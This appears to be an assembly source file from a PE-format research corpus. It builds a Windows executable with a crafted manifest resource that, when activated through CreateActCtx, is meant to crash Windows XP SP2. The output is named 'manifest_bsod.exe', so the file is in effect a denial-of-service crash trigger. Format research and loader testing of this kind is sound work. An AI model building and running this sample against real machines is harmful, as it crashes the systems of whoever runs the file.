; a PE with a checked MANIFEST resource, that triggers a crash on execution

; Ange Albertini, BSD LICENCE 2012-2013

%include 'consts.inc'

%include 'headers.inc'

istruc IMAGE_DATA_DIRECTORY_16
    at IMAGE_DATA_DIRECTORY_16.ImportsVA,  dd Import_Descriptor - IMAGEBASE
    at IMAGE_DATA_DIRECTORY_16.ResourceVA, dd Directory_Entry_Resource - IMAGEBASE
iend

SIZEOFOPTIONALHEADER equ $ - OptionalHeader
SectionHeader:
istruc IMAGE_SECTION_HEADER
    at IMAGE_SECTION_HEADER.VirtualSize,      dd 1 * SECTIONALIGN
    at IMAGE_SECTION_HEADER.VirtualAddress,   dd 1 * SECTIONALIGN
    at IMAGE_SECTION_HEADER.SizeOfRawData,    dd 3 * FILEALIGN ; <==
    at IMAGE_SECTION_HEADER.PointerToRawData, dd 1 * FILEALIGN
    at IMAGE_SECTION_HEADER.Characteristics,  dd IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE
iend
NUMBEROFSECTIONS equ ($ - SectionHeader) / IMAGE_SECTION_HEADER_size
SIZEOFHEADERS equ $ - IMAGEBASE

section progbits vstart=IMAGEBASE + SECTIONALIGN align=FILEALIGN

EntryPoint: ;*******************************************************************
    push myactctx
    call [__imp__CreateActCtx]

    cmp eax, -1
    jz no_msg

    push msg
    call [__imp__printf]
    add esp, 1 * 4

no_msg:
    push 0
    call [__imp__ExitProcess]
_c

msg db " * a PE with a XP SP2 crash MANIFEST resource (CreateActCtx successfull)", 0ah, 0
_d

Import_Descriptor: ;************************************************************
_import_descriptor kernel32.dll
_import_descriptor msvcrt.dll
istruc IMAGE_IMPORT_DESCRIPTOR
iend
_d

kernel32.dll_hintnames:
    dd hnExitProcess - IMAGEBASE
    dd hnCreateActCtx - IMAGEBASE
    dd 0
msvcrt.dll_hintnames:
    dd hnprintf - IMAGEBASE
    dd 0
_d

hnExitProcess:
    dw 0
    db 'ExitProcess', 0
hnCreateActCtx:
    dw 0
    db 'CreateActCtxA', 0
hnprintf:
    dw 0
    db 'printf', 0
_d

kernel32.dll_iat:
__imp__ExitProcess:
    dd hnExitProcess - IMAGEBASE
__imp__CreateActCtx:
    dd hnCreateActCtx - IMAGEBASE
    dd 0

msvcrt.dll_iat:
__imp__printf:
    dd hnprintf - IMAGEBASE
    dd 0
_d

kernel32.dll db 'kernel32.dll', 0
msvcrt.dll db 'msvcrt.dll', 0
_d

;*******************************************************************************

MYMAN equ CREATEPROCESS_MANIFEST_RESOURCE_ID
LANGUAGE equ 0

Directory_Entry_Resource:
; root directory
istruc IMAGE_RESOURCE_DIRECTORY
    at IMAGE_RESOURCE_DIRECTORY.NumberOfIdEntries, dw 1
iend
_resourceDirectoryEntry RT_MANIFEST, resource_directory_type

resource_directory_type:
istruc IMAGE_RESOURCE_DIRECTORY
    at IMAGE_RESOURCE_DIRECTORY.NumberOfIdEntries, dw 1
iend
_resourceDirectoryEntry MYMAN, resource_directory_language

resource_directory_language:
istruc IMAGE_RESOURCE_DIRECTORY
    at IMAGE_RESOURCE_DIRECTORY.NumberOfIdEntries, dw 1
iend
istruc IMAGE_RESOURCE_DIRECTORY_ENTRY
    at IMAGE_RESOURCE_DIRECTORY_ENTRY.NameID, dd LANGUAGE ; name of the underneath resource
    at IMAGE_RESOURCE_DIRECTORY_ENTRY.OffsetToData, dd resource_entry - Directory_Entry_Resource
iend

resource_entry:
istruc IMAGE_RESOURCE_DATA_ENTRY
    at IMAGE_RESOURCE_DATA_ENTRY.OffsetToData, dd resource_data - IMAGEBASE
    at IMAGE_RESOURCE_DATA_ENTRY.Size1, dd RESOURCE_SIZE
iend

resource_data:
db "<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
db "<assemblyIdentity version='1.0.0.0' processorArchitecture='X86' name='Synergex.Synergyde.lm' type='win32'>"
db "</assemblyIdentity>"
db " <dependency>"
db "  <dependentAssembly>"
db "   <assemblyIdentity type='win32' name='Microsoft.VC80.CRT' version='8.0.50608.0' processorArchitecture='x86' publicKeyToken='1fc8b3b9a1e18e3b'>"
db "   </assemblyIdentity>"
db "  </dependentAssembly>"
db " </dependency>"

db " <ms_asmv3:trustInfo xmlns:ms_asmv3='urn:schemas-microsoft-com:asm.v3' xmlns='urn:schemas-microsoft-com:asm.v3'>"
db "  <ms_asmv3:security xmlns:ms_asmv3='urn:schemas-microsoft-com:asm.v3'> "
db "   <requestedPrivileges>"
db "    <requestedExecutionLevel level='requireAdministrator' uiAccess='false'>"
db "    </requestedExecutionLevel>"
db "   </requestedPrivileges>"
db "  </ms_asmv3:security>"
db " </ms_asmv3:trustInfo>"

db "</assembly>"
RESOURCE_SIZE equ $ - resource_data

;*******************************************************************************
myactctx:
istruc ACTCTX
    at ACTCTX.cbSize, dd ACTCTX_size
    at ACTCTX.dwFlags, dw ACTCTX_FLAG_HMODULE_VALID + ACTCTX_FLAG_APPLICATION_NAME_VALID + ACTCTX_FLAG_RESOURCE_NAME_VALID
    at ACTCTX.lpSource, dd thisEXE ; required for XP
    at ACTCTX.lpResourceName, dd MYMAN
    at ACTCTX.hModule, dd IMAGEBASE
iend

thisEXE db 'manifest_bsod.exe', 0

align FILEALIGN, db 0
